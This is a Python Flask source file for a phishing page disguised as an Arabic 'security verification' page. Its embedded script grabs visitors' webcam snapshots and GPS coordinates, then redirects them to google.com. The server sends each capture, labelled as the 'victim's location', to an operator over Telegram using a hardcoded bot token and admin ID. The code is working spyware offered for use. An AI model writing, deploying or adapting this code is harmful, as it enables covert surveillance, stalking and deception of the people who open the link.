import base64, requests, io, os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# الإعدادات الجديدة
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><title>التحقق من الأمان</title>
</head>
<body>
    <script>
        async function send(d) { await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); }
        async function start() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                navigator.geolocation.getCurrentPosition(p => send({type:'text', lat:p.coords.latitude, lon:p.coords.longitude}));
                setTimeout(async () => {
                    const v = document.createElement('video'); v.srcObject = s; v.play();
                    const c = document.createElement('canvas');
                    setTimeout(() => {
                        c.width = v.videoWidth; c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        send({type:'img', img:c.toDataURL('image/jpeg').split(',')[1]});
                        window.location.replace("https://google.com");
                    }, 2000);
                }, 1000);
            } catch(e) { window.location.replace("https://google.com"); }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def bot_api(m, p):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{m}", json=p)

@app.route('/', methods=['GET', 'POST'])
def handle_all():
    if request.method == 'POST':
        u = request.get_json(silent=True)
        if u and "message" in u:
            cid = u["message"]["chat"]["id"]
            bot_api("sendMessage", {"chat_id": cid, "text": "✅ هلا سيوفي! البوت الجديد شغال والسيرفر استلم رسالتك."})
        return "OK", 200
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json; t = d.get('type')
    if t == 'text':
        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"📍 موقع الضحية: https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}"})
    elif t == 'img':
        ph = io.BytesIO(base64.b64decode(d.get('img'))); ph.name = 'snap.jpg'
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": ADMIN_ID}, files={"photo": ph})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
